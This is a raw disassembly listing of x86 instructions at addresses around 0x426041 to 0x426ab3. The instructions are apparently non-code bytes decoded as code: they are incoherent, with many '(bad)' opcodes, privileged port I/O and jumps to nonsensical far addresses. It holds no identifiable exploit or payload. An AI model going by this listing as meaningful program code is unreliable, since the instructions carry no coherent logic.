  426041:	test   BYTE PTR [ebp-0x2f03a123],0xb9
  426048:	add    eax,0x4af61581
  42604d:	jae    0x426014
  42604f:	adc    ecx,esi
  426051:	pop    ebp
  426052:	fnstsw WORD PTR [eax-0x78]
  426055:	out    dx,al
  426056:	mov    ecx,DWORD PTR [ebp+0x698a62e]
  42605c:	pop    esi
  42605d:	mov    ah,0x69
  42605f:	data16 cmp al,0x8f
  426062:	fstp   DWORD PTR [edi+edx*4+0x5524f0f2]
  426069:	jmp    0x42601c
  42606b:	outs   dx,DWORD PTR ds:[esi]
  42606c:	dec    esp
  42606d:	xchg   esp,eax
	...
  4260d6:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	iret   
  4260e3:	fisubr WORD PTR [ecx+0x19867d2]
  4260e9:	add    BYTE PTR [eax],al
  4260eb:	add    DWORD PTR [eax],eax
  4260ed:	add    ah,al
  4260ef:	cld    
  4260f0:	ror    DWORD PTR [edi+0x47],cl
  4260f3:	in     al,dx
  4260f4:	add    al,0x9
  4260f6:	dec    ebp
  4260f7:	test   ecx,edx
  4260f9:	jne    0x426125
  4260fb:	loope  0x426110
  4260fd:	pop    esi
  4260fe:	lods   al,BYTE PTR ds:[esi]
  4260ff:	ins    DWORD PTR es:[edi],dx
  426100:	rcr    DWORD PTR [ebx-0x5c3bf6a0],cl
  426106:	xchg   edx,eax
  426107:	push   esp
  426108:	das    
  426109:	jmp    0x4957:0x538aee
  426110:	mov    eax,ds:0x176617fd
  426115:	sbb    ecx,esp
  426117:	pop    ebx
  426118:	faddp  st(3),st
  42611a:	and    al,0x2f
  42611c:	mov    edx,ebx
  42611e:	shl    BYTE PTR ds:0x46821e4d,1
  426124:	jg     0x426135
  426126:	sbb    DWORD PTR [edi-0x57],edi
  426129:	ror    bh,cl
  42612b:	leave  
  42612c:	cvtpi2ps xmm6,QWORD PTR [edx+0x3e0b51b3]
  426133:	mov    al,0xaf
  426135:	sbb    BYTE PTR [eax+0x4372f0bd],dh
  42613b:	mov    ss,WORD PTR [edx]
  42613d:	fld    TBYTE PTR [edi+0x18]
  426140:	mov    edi,0xa95b09f9
  426145:	clc    
  426146:	cmp    eax,DWORD PTR ss:[edx+edi*4+0x9ec2b08]
  42614e:	arpl   WORD PTR [ebp+0x2a727bb5],sp
  426154:	call   0xe3e0:0x80741314
  42615b:	pop    ss
  42615c:	loope  0x4261bf
  42615e:	push   esi
  42615f:	cli    
  426160:	jle    0x42613e
  426162:	and    al,0x69
  426164:	cmp    ebp,ebp
  426166:	je     0x426177
  426168:	or     al,0x2a
  42616a:	cmp    esp,esi
  42616c:	dec    edx
  42616d:	ficomp WORD PTR [edx]
  42616f:	sub    esp,DWORD PTR [edi+ecx*1]
  426172:	xor    al,0x53
  426174:	or     bl,dl
  426176:	out    0x91,al
  426178:	sti    
  426179:	xor    ah,bl
  42617b:	inc    edx
  42617c:	mov    es,WORD PTR [eax]
  42617e:	fimul  DWORD PTR [eax]
  426180:	dec    edi
  426181:	mov    ds:0xab8840d4,eax
  426186:	mov    bh,0x44
  426188:	mov    cl,bh
  42618a:	test   al,0x63
  42618c:	pop    edi
  42618d:	dec    edi
  42618e:	add    eax,0x1d6624a6
  426193:	pushf  
  426194:	aam    0x1
  426196:	addr16 loope 0x42614e
  426199:	adc    al,0xa3
  42619b:	repnz adc cl,dl
  42619e:	shr    edi,0x67
  4261a1:	or     al,0x77
  4261a3:	cli    
  4261a4:	inc    ebp
  4261a5:	mov    eax,ds:0x662e8ae4
  4261aa:	adc    DWORD PTR [ebp-0x66874831],ecx
  4261b0:	push   ebx
  4261b1:	addr16 loop 0x426195
  4261b4:	ds push ebp
  4261b6:	mov    al,0x7d
  4261b8:	dec    ebx
  4261b9:	mov    eax,ds:0xbc40312b
  4261be:	xchg   esi,eax
  4261bf:	mov    DWORD PTR [ebp-0x1654f1e2],ebp
  4261c5:	jne    0x4261d6
  4261c7:	add    eax,0x88b061a3
  4261cc:	push   esp
  4261cd:	and    edx,DWORD PTR ds:0xad26a1a1
  4261d3:	adc    BYTE PTR [esp+esi*8-0x7409fce0],dh
  4261da:	adc    ah,dh
  4261dc:	push   0x6c
  4261de:	(bad)  
  4261df:	push   esp
  4261e0:	xor    bh,ch
  4261e2:	gs (bad) 
  4261e4:	in     eax,dx
  4261e5:	jno    0x426199
  4261e7:	adc    eax,DWORD PTR [ebp*4-0x710b5729]
	...
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx+0x55a09f27],0xffffffc6
  426266:	addr16 cdq 
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	mov    ds:0xcdb48479,eax
  426273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426274:	inc    esp
  426275:	stos   DWORD PTR es:[edi],eax
  426276:	arpl   WORD PTR ds:[ebx-0x4e44b5a9],ax
  42627d:	push   ecx
  42627e:	fs es mov esi,0xc5615903
  426285:	sti    
  426286:	push   cs
  426287:	xchg   ecx,eax
  426288:	clc    
  426289:	ror    DWORD PTR [edx],cl
  42628b:	sub    bl,al
  42628d:	(bad)  
  42628e:	repz mov bl,0xf6
  426291:	ins    DWORD PTR es:[edi],dx
  426292:	mov    DWORD PTR [ecx-0x3],eax
  426295:	aaa    
  426296:	add    al,0x11
  426298:	inc    edx
  426299:	mov    edi,DWORD PTR ds:0x6f6d09a0
  42629f:	retf   0x1422
  4262a2:	inc    edi
  4262a3:	sbb    DWORD PTR [ebx-0x65c57672],edx
  4262a9:	(bad)  
  4262aa:	hlt    
  4262ab:	jg     0x426288
  4262ad:	xchg   ebx,eax
  4262ae:	cmp    eax,0xb871057
  4262b3:	repz mov ebx,0x1ee33be5
  4262b9:	xor    BYTE PTR [ecx],0xb6
  4262bc:	mov    esp,0x692de97
  4262c1:	pop    ecx
  4262c2:	inc    ebp
  4262c3:	std    
  4262c4:	xor    bh,0x6
  4262c7:	fwait
  4262c8:	jg     0x4262f9
  4262ca:	dec    ebp
  4262cb:	cmp    al,0xbc
  4262cd:	adc    ax,0x717f
  4262d1:	repz in al,dx
  4262d3:	sub    BYTE PTR ds:[esi],0x7
  4262d7:	test   eax,0xcd2bc94
  4262dc:	mov    dl,al
  4262de:	loop   0x426293
  4262e0:	dec    edi
  4262e1:	mov    dl,0x10
  4262e3:	adc    eax,0xde018b24
  4262e8:	fs out dx,eax
  4262ea:	jp     0x426344
  4262ec:	xchg   edx,eax
  4262ed:	xchg   DWORD PTR [ebx+eiz*2],edi
  4262f0:	std    
  4262f1:	push   edi
  4262f2:	inc    ebp
  4262f3:	pop    ebx
  4262f4:	jg     0x426350
  4262f6:	and    BYTE PTR [edx-0x21],bh
  4262f9:	retf   
  4262fa:	sbb    BYTE PTR [eax+edx*4],ah
  4262fd:	pop    ebp
  4262fe:	xor    dh,dh
  426300:	xor    dh,BYTE PTR [ecx+0x53]
  426303:	out    dx,eax
  426304:	ss jecxz 0x426314
  426307:	adc    bl,BYTE PTR [edi]
  426309:	jns    0x426364
  42630b:	cmc    
  42630c:	sbb    al,ah
  42630e:	cmc    
  42630f:	mov    edi,0xc160486c
  426314:	xchg   edx,eax
  426315:	pop    ecx
  426316:	mov    WORD PTR ds:[esi+0x553eebda],?
  42631d:	imul   edi,DWORD PTR [ebx-0x15b003d0],0xffffffe4
  426324:	jb     0x42634a
  426326:	dec    edi
  426327:	imul   edx,DWORD PTR [edi],0x20
  42632a:	adc    DWORD PTR [esp+ebp*2-0x7b53bca],eax
  426331:	or     ch,BYTE PTR [edx-0x68af854d]
  426337:	pop    eax
  426338:	das    
  426339:	dec    esp
  42633a:	hlt    
  42633b:	test   al,0xf5
  42633d:	ss jmp 0x98224d61
  426343:	jo     0x4262ee
  426345:	dec    edi
  426346:	dec    eax
  426347:	or     al,0x78
  426349:	test   BYTE PTR [esi+0x4b],0x4e
  42634d:	jecxz  0x426307
  42634f:	outs   dx,BYTE PTR ds:[esi]
  426350:	cmp    bh,BYTE PTR [edi+0x37238d0d]
  426356:	dec    edi
  426357:	push   ebp
  426358:	adc    al,0xcd
  42635a:	sub    edi,DWORD PTR [ecx]
  42635c:	sbb    ecx,ebp
  42635e:	enter  0xc60e,0xf
  426362:	xchg   ebp,eax
  426363:	add    bh,bh
  426365:	sub    eax,DWORD PTR [esi]
  426367:	inc    ebx
  426368:	gs sub eax,0x17058860
	...
  4263d6:	push   esp
  4263d7:	and    eax,0xeefd4e8d
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0xf8f7a12c
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	jne    0x426432
  4263f0:	inc    eax
  4263f1:	fnsave [ebx+0x23]
  4263f4:	dec    edi
  4263f5:	sbb    edi,esp
  4263f7:	pop    ds
  4263f8:	jecxz  0x4263c8
  4263fa:	jmp    0xd1768af8
  4263ff:	mov    bh,0xa
  426401:	dec    ebx
  426402:	in     eax,0x81
  426404:	xor    al,0x6c
  426406:	mov    dh,0xe4
  426408:	add    eax,0x876b0fe0
  42640d:	inc    eax
  42640e:	sbb    eax,DWORD PTR [ecx+0x591c6798]
  426414:	cmp    eax,0x1c38a757
  426419:	pop    edi
  42641a:	jecxz  0x4263d3
  42641c:	push   ss
  42641d:	rcl    DWORD PTR [edi],1
  42641f:	(bad)  
  426420:	jmp    0x42649a
  426422:	cwde   
  426423:	cmp    eax,0xb54d8804
  426428:	fwait
  426429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42642a:	aam    0x74
  42642c:	dec    ebx
  42642d:	sti    
  42642e:	sbb    al,0x85
  426430:	icebp  
  426431:	mov    bh,0xb3
  426433:	push   edx
  426434:	ret    
  426435:	mov    edi,0x5f34bee0
  42643a:	in     al,0x6e
  42643c:	(bad)  
  42643e:	and    al,BYTE PTR [eax]
  426440:	sub    al,0x96
  426442:	jecxz  0x42646e
  426444:	mov    ss,edi
  426446:	(bad)  
  426447:	jecxz  0x426407
  426449:	add    BYTE PTR [edi-0x5a],dh
  42644c:	push   ds
  42644d:	test   BYTE PTR [ebx-0x6b162f45],0x70
  426454:	cwde   
  426455:	xchg   DWORD PTR [edi],ecx
  426457:	je     0x4264bd
  426459:	(bad)  
  42645a:	out    dx,eax
  42645b:	pop    ebp
  42645c:	stos   DWORD PTR es:[edi],eax
  42645d:	fcomp  QWORD PTR [ebx]
  42645f:	xor    eax,0xfa5c75c6
  426464:	xchg   ebp,eax
  426465:	(bad)  
  426467:	stc    
  426468:	and    eax,0x7938fff1
  42646d:	mov    es,WORD PTR [edx+ebx*4+0x4]
  426471:	into   
  426472:	cmp    edx,DWORD PTR [edx-0x5e8c55f8]
  426478:	lods   al,BYTE PTR ds:[esi]
  426479:	mov    ah,0xdc
  42647b:	mov    ds:0x5bcc7cc3,al
  426480:	(bad)  
  426481:	outs   dx,BYTE PTR ds:[esi]
  426482:	(bad)  
  426483:	adc    dl,bl
  426485:	scas   eax,DWORD PTR es:[edi]
  426486:	jg     0x4264fe
  426488:	cld    
  426489:	outs   dx,DWORD PTR ds:[esi]
  42648a:	adc    BYTE PTR [eax],dh
  42648c:	mov    ebp,0x33d5d6fb
  426491:	in     al,0xca
  426493:	repz pop esp
  426495:	test   ebp,ebp
  426497:	(bad)  
  426498:	repnz in eax,dx
  42649a:	scas   al,BYTE PTR es:[edi]
  42649b:	aaa    
  42649c:	ror    edx,cl
  42649e:	fsubrp st(0),st
  4264a0:	mov    eax,eax
  4264a2:	xchg   esp,eax
  4264a3:	xchg   esp,eax
  4264a4:	ds out dx,eax
  4264a6:	push   edi
  4264a7:	dec    ecx
  4264a8:	xchg   ebx,eax
  4264a9:	dec    ecx
  4264aa:	(bad)  
  4264ab:	aam    0x5e
  4264ad:	in     eax,dx
  4264ae:	push   0xffffffaa
  4264b0:	pop    ebp
  4264b1:	fist   WORD PTR [ecx+0x897f482]
  4264b7:	sahf   
  4264b8:	xchg   BYTE PTR [edi+0x1f],cl
  4264bb:	aad    0x1
  4264bd:	add    BYTE PTR [ecx-0x1cd0dda2],cl
  4264c3:	xor    dh,bl
  4264c5:	enter  0xa5c4,0x24
  4264c9:	pop    esi
  4264ca:	out    dx,eax
  4264cb:	or     DWORD PTR [edx+0x4409b05],eax
  4264d1:	stos   BYTE PTR es:[edi],al
  4264d2:	aas    
  4264d3:	imul   ecx,ebp,0xfffffff7
  4264d6:	popa   
  4264d7:	xchg   ebx,eax
  4264d8:	jmp    0x426514
  4264da:	xchg   edi,eax
  4264db:	sbb    edi,ecx
  4264dd:	mov    esp,0x6382366b
  4264e2:	loope  0x42648d
  4264e4:	test   BYTE PTR [edi+0x620eace5],bh
  4264ea:	jne    0x4264bc
  4264ec:	(bad)  
  4264ed:	mov    cl,0x0
	...
  426553:	add    BYTE PTR [eax],al
  426555:	add    BYTE PTR [ecx+0x6f],ch
  426558:	mov    BYTE PTR [eax],cl
  42655a:	mov    gs,edi
  42655c:	jmp    0x8abb74d0
  426561:	test   DWORD PTR [edx+0x7a],ebp
  426564:	fsub   st(1),st
  426566:	addr16 fwait
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	(bad)  
  42656f:	iret   
  426570:	lds    ebp,FWORD PTR [eax-0x17]
  426573:	je     0x4265e0
  426575:	mov    bh,0x3c
  426577:	aas    
  426578:	shl    BYTE PTR [ebx+0x56],cl
  42657b:	cmp    ecx,DWORD PTR ds:0x35cf9342
  426581:	int3   
  426582:	lea    ebx,cs:[eax+eiz*4-0x2acacf79]
  42658a:	rcl    DWORD PTR [ebx-0x28],1
  42658d:	adc    esp,esp
  42658f:	fisttp DWORD PTR [edx+0x3dc6d487]
  426595:	mov    gs,WORD PTR [edx]
  426597:	scas   eax,DWORD PTR es:[edi]
  426598:	push   edx
  426599:	push   cs
  42659a:	mov    dl,0xec
  42659c:	push   edi
  42659d:	sti    
  42659e:	aam    0x7f
  4265a0:	mov    eax,0xe0c5e97e
  4265a5:	leave  
  4265a6:	popa   
  4265a7:	xchg   BYTE PTR [eax],ch
  4265a9:	retf   0x1252
  4265ac:	mov    bh,0x83
  4265ae:	push   eax
  4265af:	aas    
  4265b0:	out    dx,eax
  4265b1:	and    DWORD PTR [eax-0x3e6d44dd],ebx
  4265b7:	sahf   
  4265b8:	push   ss
  4265b9:	jecxz  0x426549
  4265bb:	xchg   esp,eax
  4265bc:	mov    ah,0x9e
  4265be:	push   edi
  4265bf:	cld    
  4265c0:	or     cl,BYTE PTR ds:0x14836105
  4265c6:	scas   eax,DWORD PTR es:[edi]
  4265c7:	or     BYTE PTR [esi-0x5f],0xeb
  4265cb:	jnp    0x426578
  4265cd:	add    ecx,ecx
  4265cf:	xlat   BYTE PTR ds:[ebx]
  4265d0:	stos   BYTE PTR es:[edi],al
  4265d1:	in     eax,0xcb
  4265d3:	mov    bh,BYTE PTR [eax+0x71]
  4265d6:	pop    es
  4265d7:	jp     0x42657f
  4265d9:	sti    
  4265da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265db:	mov    dl,0x7e
  4265dd:	sbb    ebx,DWORD PTR [esi]
  4265df:	adc    ecx,DWORD PTR [ebp+0x35424dcb]
  4265e5:	pop    ecx
  4265e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265e7:	dec    ecx
  4265e8:	mov    ds:0xe6cee1cf,eax
  4265ed:	and    ebx,DWORD PTR cs:[ebx]
  4265f0:	enter  0x609e,0xd8
  4265f4:	xor    eax,0x9e0a7c84
  4265f9:	xor    DWORD PTR [eax+0x33],eax
  4265fc:	stos   DWORD PTR es:[edi],eax
  4265fd:	imul   edx,ecx,0xffffff9d
  426600:	adc    dh,BYTE PTR [eax]
  426602:	dec    edx
  426603:	adc    esp,DWORD PTR [ebx+0x31]
  426606:	xchg   DWORD PTR [edx+edi*2-0x55],edx
  42660a:	inc    ecx
  42660b:	or     eax,0x2cd8e058
  426610:	sti    
  426611:	sahf   
  426612:	test   dl,ah
  426614:	jmp    0x4265c1
  426616:	and    edx,DWORD PTR [ecx]
  426618:	xor    esi,DWORD PTR [esi+0x5238d899]
  42661e:	mov    ch,0x8f
  426620:	hlt    
  426621:	inc    ebp
  426622:	jle    0x4265a8
  426624:	jae    0x4265e2
  426626:	dec    ebp
  426627:	rol    BYTE PTR [ebx],1
  426629:	icebp  
  42662a:	add    DWORD PTR [edx+0x18311d9a],esi
  426630:	pop    ds
  426631:	cmovo  eax,DWORD PTR [edi-0xdd3d1d3]
  426638:	enter  0xd146,0xac
  42663c:	repz mov ds:0x4251f5,al
  426642:	cmp    cl,BYTE PTR [ebp-0x78febf2f]
  426648:	leave  
  426649:	scas   al,BYTE PTR es:[edi]
  42664a:	je     0x426650
  42664c:	xor    al,0x6b
  42664e:	popa   
  42664f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426650:	loopne 0x42664e
  426652:	scas   eax,DWORD PTR es:[edi]
  426653:	jns    0x42667e
  426655:	mov    WORD PTR ds:0x7d454476,?
  42665b:	inc    edi
  42665c:	sub    al,0x48
  42665e:	and    BYTE PTR [edx],ah
  426660:	xor    ecx,DWORD PTR [ebx-0x8]
  426663:	mov    ah,dh
  426665:	mov    eax,ds:0x19a01ae3
  42666a:	dec    esi
  42666b:	lahf   
  42666c:	jae    0x426638
	...
  4266d6:	adc    cl,bl
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi+0x6d4e6da4]
  4266e4:	mov    bl,0xf4
  4266e6:	addr16 pushf 
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	shl    DWORD PTR [ecx],cl
  4266f0:	sbb    bh,BYTE PTR [bx-0x78]
  4266f4:	mov    ds:0xfd377339,eax
  4266f9:	xchg   edx,eax
  4266fa:	xor    ah,dh
  4266fc:	sar    dh,cl
  4266fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266ff:	push   eax
  426700:	stos   BYTE PTR es:[edi],al
  426701:	sbb    DWORD PTR [edi],edx
  426703:	jne    0x426710
  426705:	adc    DWORD PTR [ecx+0x66],ebp
  426708:	push   ss
  426709:	pop    ebx
  42670a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42670b:	rol    DWORD PTR [esi-0x7f3a7abc],cl
  426711:	adc    bl,dh
  426713:	ins    DWORD PTR es:[edi],dx
  426714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426715:	cdq    
  426716:	push   cs
  426717:	or     bh,BYTE PTR [edi+0x64]
  42671a:	xchg   edx,eax
  42671b:	mov    eax,0xecaea55b
  426720:	push   ebp
  426721:	rol    BYTE PTR [ebx+0x2a],cl
  426724:	jo     0x4266bc
  426726:	js     0x42671f
  426728:	add    ebp,DWORD PTR [ebp-0x49df70a6]
  42672e:	ja     0x426709
  426730:	das    
  426731:	pop    ebp
  426732:	sub    ecx,DWORD PTR ds:0xc4d1a137
  426738:	and    al,0x73
  42673a:	jne    0x42670c
  42673c:	xor    eax,0xdd533386
  426741:	fwait
  426742:	call   0xa695:0x9984a1ad
  426749:	cmp    DWORD PTR [ecx-0x75],edx
  42674c:	fmul   DWORD PTR [edi-0x17e3ab7b]
  426752:	adc    BYTE PTR [ebp-0x2e],ch
  426755:	adc    al,0x76
  426757:	sbb    ch,BYTE PTR [esi+esi*2+0x5269ef35]
  42675e:	jns    0x426742
  426760:	sub    al,0x38
  426762:	mov    al,ds:0xd19bef56
  426767:	dec    eax
  426768:	nop
  426769:	sti    
  42676a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42676b:	or     al,0x6d
  42676d:	fwait
  42676e:	icebp  
  42676f:	inc    ebp
  426770:	stos   DWORD PTR es:[edi],eax
  426771:	fdiv   QWORD PTR [ebx]
  426773:	pop    es
  426774:	pop    edi
  426775:	outs   dx,BYTE PTR ds:[esi]
  426776:	stos   BYTE PTR es:[edi],al
  426777:	xor    al,0x5b
  426779:	sbb    esp,DWORD PTR [esp+edi*2-0x438684bf]
  426780:	ds loopne 0x42677f
  426783:	pop    es
  426784:	sbb    BYTE PTR [esi],dl
  426786:	pusha  
  426787:	adc    eax,DWORD PTR [ecx-0x6b]
  42678a:	mov    al,0xfd
  42678c:	bound  ecx,QWORD PTR [ecx+0x1d]
  42678f:	ja     0x42678f
  426791:	rcl    DWORD PTR [eax-0x15],1
  426794:	cmp    al,BYTE PTR [ebx+0x14fca48e]
  42679a:	jge    0x42676f
  42679c:	test   edi,edi
  42679e:	hlt    
  42679f:	and    edi,ecx
  4267a1:	pop    ecx
  4267a2:	jno    0x4267ea
  4267a4:	dec    ebx
  4267a5:	add    BYTE PTR [ecx],bh
  4267a7:	adc    al,0xf2
  4267a9:	pop    ebx
  4267aa:	cs lahf 
  4267ac:	ss into 
  4267ae:	add    DWORD PTR [edx-0xb],esp
  4267b1:	mov    esp,0x6cbb240f
  4267b6:	stc    
  4267b7:	enter  0x1a9d,0xc7
  4267bb:	rcl    BYTE PTR [ebx-0x1],0x6a
  4267bf:	sub    esi,eax
  4267c1:	pop    ecx
  4267c2:	mov    ebx,0x2ddbabaa
  4267c7:	int3   
  4267c8:	mov    bl,0xbb
  4267ca:	cmp    DWORD PTR [esp+esi*1],0x3a
  4267ce:	lods   eax,DWORD PTR ds:[esi]
  4267cf:	es and dl,dl
  4267d2:	dec    ecx
  4267d3:	ins    DWORD PTR es:[edi],dx
  4267d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	cld    
  4267d6:	call   0xb698:0x882a45dc
  4267dd:	cmp    eax,0x3e8d8721
  4267e2:	push   es
  4267e3:	jl     0x4267f3
  4267e5:	push   DWORD PTR [esp+edi*8]
  4267e8:	das    
  4267e9:	loopne 0x4267a5
  4267eb:	pop    ebx
  4267ec:	jmp    0x426864
	...
  426855:	add    BYTE PTR [eax-0xd53173],bh
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	inc    ebx
  426863:	adc    ebp,DWORD PTR [edi-0x1c]
  426866:	addr16 popf 
  426868:	add    DWORD PTR [eax],eax
  42686a:	add    BYTE PTR [ecx],al
  42686c:	add    BYTE PTR [eax],al
  42686e:	imul   esi,edx,0x47cf014e
  426874:	call   0x860d:0xba1ed3cc
  42687b:	in     al,dx
  42687c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42687d:	adc    BYTE PTR [edi+0x11010315],dl
  426883:	pop    eax
  426884:	sbb    al,0xc5
  426886:	jo     0x42689e
  426888:	pop    edx
  426889:	jmp    0x42689b
  42688b:	xor    al,0xc2
  42688d:	dec    ebx
  42688e:	pop    edi
  42688f:	(bad)  
  426890:	inc    BYTE PTR [edx]
  426892:	adc    DWORD PTR [ebx+0x5df8b9e2],edi
  426898:	(bad)  
  42689a:	push   es
  42689b:	sbb    cl,BYTE PTR [eax+0x6e]
  42689e:	sub    ch,al
  4268a0:	mov    esp,0xe598f087
  4268a5:	loop   0x42682c
  4268a7:	out    0x3c,al
  4268a9:	add    DWORD PTR [eax-0x285400bd],0xb0a564f2
  4268b3:	push   ebx
  4268b4:	xchg   ecx,eax
  4268b5:	push   ebx
  4268b6:	push   ebx
  4268b7:	inc    ebx
  4268b8:	and    eax,0x5d2bfc22
  4268bd:	sbb    esi,DWORD PTR [edx+0x4d39b3f2]
  4268c3:	jmp    0xb201:0x5b67e0e9
  4268ca:	dec    edi
  4268cb:	je     0x42688d
  4268cd:	out    dx,eax
  4268ce:	imul   BYTE PTR [edi+0x7bdca396]
  4268d4:	xor    DWORD PTR [eax-0x1f15df63],ebx
  4268da:	cli    
  4268db:	dec    ebx
  4268dc:	cdq    
  4268dd:	bound  eax,QWORD PTR [ecx]
  4268df:	add    DWORD PTR [eax],edi
  4268e1:	push   ebx
  4268e2:	sub    ecx,DWORD PTR [edx-0x29]
  4268e5:	cmp    edx,DWORD PTR [eax+0x38]
  4268e8:	mov    dl,0x1
  4268ea:	icebp  
  4268eb:	jecxz  0x42688d
  4268ed:	or     ebx,DWORD PTR [esi]
  4268ef:	outs   dx,DWORD PTR ds:[esi]
  4268f0:	mov    fs,eax
  4268f2:	(bad)  
  4268f4:	and    al,0xc7
  4268f6:	xlat   BYTE PTR ds:[ebx]
  4268f7:	xor    DWORD PTR [ecx],0x7939b06f
  4268fd:	lods   al,BYTE PTR ds:[esi]
  4268fe:	(bad)  
  4268ff:	pop    esp
  426900:	push   es
  426901:	jb     0x426896
  426903:	dec    esi
  426904:	add    bh,bh
  426906:	and    al,BYTE PTR [ecx+eax*2+0x1b]
  42690a:	jp     0x426892
  42690c:	stc    
  42690d:	xchg   DWORD PTR [edx+0x6],esp
  426910:	in     al,0x2a
  426912:	xchg   al,cl
  426914:	jecxz  0x426950
  426916:	aad    0x57
  426918:	pop    ss
  426919:	sbb    al,0x5f
  42691b:	pop    esp
  42691c:	xchg   DWORD PTR [eax+0x6914c519],esp
  426922:	sub    bl,dl
  426924:	loope  0x4268fe
  426926:	or     al,0xea
  426928:	in     al,0x12
  42692a:	jmp    0x8a68f70a
  42692f:	sbb    BYTE PTR [ebp-0x41],ah
  426932:	mov    eax,0xc2ccf393
  426937:	ret    
  426938:	int3   
  426939:	or     ebx,DWORD PTR [edx+0x66]
  42693c:	sbb    dh,dl
  42693e:	mov    al,0xcc
  426940:	add    BYTE PTR [esi-0x6a],cl
  426943:	adc    esi,DWORD PTR es:[eax+edi*8+0xd7c601]
  42694b:	rcr    BYTE PTR [ecx-0x73451e04],1
  426951:	ficom  DWORD PTR [ecx+eiz*2+0x7be0e4cb]
  426958:	mov    cl,BYTE PTR [edi-0x5b]
  42695b:	xchg   BYTE PTR [eax+0x7668342a],dl
  426961:	push   edi
  426962:	loop   0x4268ea
  426964:	xor    al,0xc7
  426966:	jmp    0x4269db
  426968:	jb     0x4269c2
  42696a:	mov    dl,0x56
  42696c:	push   0xffffff8e
	...
  4269d6:	mov    WORD PTR [esi+0x7d],cs
  4269d9:	jge    0x4269da
  4269db:	jg     0x426969
  4269dd:	jmp    FWORD PTR [ebx]
  4269df:	in     al,dx
  4269e0:	lahf   
  4269e1:	mov    eax,DWORD PTR [ebx+0x16]
  4269e4:	fcmovnb st,st(6)
  4269e6:	addr16 sahf 
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	inc    ecx
  4269ef:	idiv   DWORD PTR [ebx+0x69]
  4269f2:	xor    BYTE PTR [ebx-0x1c0d01cd],0x46
  4269f9:	cmp    eax,0xb73c99fd
  4269fe:	jb     0x426a05
  426a00:	push   esi
  426a01:	fs out dx,eax
  426a03:	dec    edi
  426a04:	lea    esi,[edi]
  426a06:	rcl    esi,cl
  426a08:	(bad)  
  426a09:	out    0x1,al
  426a0b:	push   edi
  426a0c:	xor    BYTE PTR [esp+ebp*2+0x6d],dh
  426a10:	adc    dh,BYTE PTR [ebp+0x690edce0]
  426a16:	test   al,0xa5
  426a18:	mov    edi,DWORD PTR [eax-0x72c6f75a]
  426a1e:	mov    ch,BYTE PTR [edi]
  426a20:	mov    al,ds:0xfb6bd9a8
  426a25:	les    esp,FWORD PTR [ebp-0x17]
  426a28:	jno    0x426a89
  426a2a:	mov    cl,0x9e
  426a2c:	push   0x72
  426a2e:	rol    DWORD PTR [ebx-0x61],0xc
  426a32:	mov    bh,BYTE PTR [ecx]
  426a34:	in     eax,dx
  426a35:	ret    0x56a3
  426a38:	pop    esp
  426a39:	mov    esp,?
  426a3b:	xchg   BYTE PTR [esi-0x63],bl
  426a3e:	cmp    eax,0x35858dfb
  426a43:	mov    ch,0xcc
  426a45:	test   al,0x61
  426a47:	cmp    ah,BYTE PTR [edi]
  426a49:	fldcw  WORD PTR [esi+0x7]
  426a4c:	into   
  426a4d:	addr16 loop 0x426a3f
  426a50:	repz or ebx,0xee9073db
  426a57:	hlt    
  426a58:	ja     0x426a43
  426a5a:	fs cs aad 0x85
  426a5e:	add    bl,BYTE PTR [edx-0x449a86a2]
  426a64:	fild   QWORD PTR [ecx-0x11]
  426a67:	or     al,ch
  426a69:	sar    DWORD PTR [edx+0x4a8bac81],cl
  426a6f:	js     0x426a69
  426a71:	aad    0xe7
  426a73:	adc    DWORD PTR [edi],edi
  426a75:	cmp    eax,0xc23efe74
  426a7a:	mov    eax,ds:0xe02705b1
  426a7f:	cmp    esi,DWORD PTR [esi+0x6b0559bf]
  426a85:	and    eax,0x1252cc19
  426a8a:	pop    esi
  426a8b:	jmp    0xe08a7b24
  426a90:	icebp  
  426a91:	repz out 0x2b,al
  426a94:	jp     0x426acb
  426a96:	push   0xbbde8db
  426a9b:	ins    DWORD PTR es:[edi],dx
  426a9c:	jl     0x426b0c
  426a9e:	ins    DWORD PTR es:[edi],dx
  426a9f:	loop   0x426a5d
  426aa1:	sahf   
  426aa2:	in     eax,0x5f
  426aa4:	lds    ebx,FWORD PTR [edi]
  426aa6:	lods   eax,DWORD PTR ds:[esi]
  426aa7:	aad    0x5b
  426aa9:	xlat   BYTE PTR ds:[ebx]
  426aaa:	iret   
  426aab:	loope  0x426b23
  426aad:	fidiv  DWORD PTR [eax]
  426aaf:	jns    0x426a61
  426ab1:	jle    0x426a70
  426ab3:	pop    ebx
